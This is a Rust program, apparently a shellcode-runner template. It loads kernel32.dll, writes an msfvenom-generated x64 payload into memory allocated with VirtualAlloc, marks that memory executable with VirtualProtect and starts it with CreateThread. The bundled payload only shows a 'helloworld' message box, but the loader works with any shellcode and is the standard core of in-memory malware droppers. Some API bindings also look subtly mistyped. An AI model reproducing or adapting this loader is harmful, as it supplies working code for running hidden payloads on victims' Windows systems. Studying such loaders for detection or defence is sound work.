use std::ffi::c_void;
use libloading::{Library, Symbol};
use std::ptr::{null, null_mut};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_READWRITE: u32 = 0x04;
const FALSE: i32 = 0;
const WAIT_FAILED: u32 = 0xFFFFFFFF;

struct WindowsAPI {
    lib: Library,
}

impl WindowsAPI {
    unsafe fn new() -> WindowsAPI {
        WindowsAPI {
            lib: Library::new("kernel32.dll").unwrap(),
        }
    }

    unsafe fn load_func<T>(&self, func_name: &[u8]) -> Symbol<T> {
        self.lib.get(func_name).unwrap()
    }

    unsafe fn virtual_protect(&self, addr: *const c_void, size: usize, protect: u32, old_protect: *mut u32) -> i32 {
        let func: Symbol<unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32> = self.load_func(b"VirtualProtect");
        func(addr, size, protect, old_protect)
    }

    unsafe fn virtual_alloc(&self, addr: *const c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
        let func: Symbol<unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void> = self.load_func(b"VirtualAlloc");
        func(addr, size, alloc_type, protect)
    }

    unsafe fn create_thread(&self, attr: *const c_void, stack_size: usize, start_addr: *const c_void, param: u32, creation_flags: *mut u32) -> isize {
        let func: Symbol<unsafe extern "C" fn(*const c_void, usize, *const c_void, u32, *mut u32) -> isize> = self.load_func(b"CreateThread");
        func(attr, stack_size, start_addr, param, creation_flags)
    }

    unsafe fn get_last_error(&self) -> u32 {
        let func: Symbol<unsafe extern "C" fn() -> u32> = self.load_func(b"GetLastError");
        func()
    }

    unsafe fn wait_for_single_object(&self, handle: isize, milliseconds: u32) {
        let func: Symbol<unsafe extern "C" fn(isize, u32) -> u32> = self.load_func(b"WaitForSingleObject");
        func(handle, milliseconds);
    }
}

fn main() {
  // msfvenom -p windows/x64/messagebox TEXT=helloworld -f rust
  const SHELLCODE: [u8; 316] = [
    0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
    0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
    0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
    0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
    0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
    0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
    0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
    0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
    0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
    0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
    0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
    0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
    0x48,0x8d,0x8d,0x24,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
    0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
    0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x19,0x01,
    0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
    0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
    0x68,0x65,0x6c,0x6c,0x6f,0x77,0x6f,0x72,0x6c,0x64,0x00,0x4d,
    0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00,0x75,0x73,
    0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
  ];

  const SIZE: usize = SHELLCODE.len();

  let win_api = unsafe { WindowsAPI::new() };

  let addr = unsafe { 
    win_api.virtual_alloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) 
  };
  if addr.is_null() {
    println!("Failed to allocate memory : {:?}", unsafe { win_api.get_last_error() });
  } else {
    println!("Allocated Address : {:?}", addr);
  }

  println!("Copying Shellcode to allocated address...");
  unsafe { std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), addr as *mut u8, SIZE) };

  println!("Changing Memory Protection...");
  let mut old_protect = PAGE_READWRITE;
  let result = unsafe { win_api.virtual_protect(addr, SIZE, PAGE_EXECUTE, &mut old_protect) };
  if result == FALSE {
    println!("Failed to change memory protection : {:?}", unsafe { win_api.get_last_error() });
  } else {
    println!("Memory Protection Changed : {:?}", old_protect);
  }

  println!("Creating Thread...");
  let thread = unsafe { win_api.create_thread( 
    null(),
      0, 
      addr, 
      0, 
      null_mut()
  )};

  if thread == 0 {
    println!("Failed to create thread : {:?}", unsafe { win_api.get_last_error() });
  } else {
    println!("Thread Created : {:?}", thread);
  }

  unsafe { win_api.wait_for_single_object(thread, WAIT_FAILED) };
}
